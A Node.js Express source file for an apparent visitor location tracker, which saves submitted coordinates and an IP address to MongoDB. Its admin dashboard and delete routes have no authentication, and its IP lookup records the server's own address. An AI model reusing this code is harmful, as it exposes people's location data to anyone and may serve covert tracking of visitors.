const express = require("express");
const mongoose = require("mongoose");
const axios = require("axios");
const dotenv = require("dotenv");
dotenv.config();

const app = express();
app.set("view engine", "ejs");
app.set("views", __dirname + "/views");
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

mongoose.connect(process.env.MONGO_URL)
  .then(() => console.log("MongoDB Connected"))
  .catch(err => console.log(err));

const LocationSchema = new mongoose.Schema({
  lat: String,
  lon: String,
  ip: String,
  createdAt: { type: Date, default: Date.now }
});

const Location = mongoose.model("Location", LocationSchema);

/* 🔐 LOGIN PAGE */
app.get("/admin", (req, res) => {
  res.render("login");
});

/* 📊 DASHBOARD (NO SERVER CHECK) */
app.get("/admin/dashboard", async (req, res) => {
  const data = await Location.find().sort({ createdAt: -1 });
  res.render("index", { data });
});

/* 🗑 DELETE SINGLE */
app.post("/delete/:id", async (req, res) => {
  await Location.findByIdAndDelete(req.params.id);
  res.redirect("/admin/dashboard");
});

/* 🗑 DELETE ALL */
app.post("/delete-all", async (req, res) => {
  await Location.deleteMany({});
  res.redirect("/admin/dashboard");
});

/* 🎯 TRACK */
app.get("/", (req, res) => {
  res.render("track");
});

/* SAVE */
app.post("/save", async (req, res) => {
  const { lat, lon } = req.body;
  const ip = (await axios.get("https://api64.ipify.org?format=json")).data.ip;
  await Location.create({ lat, lon, ip });
  res.json({ success: true });
});
app.listen(3000, () =>
  console.log("Running → http://localhost:3000/track")
);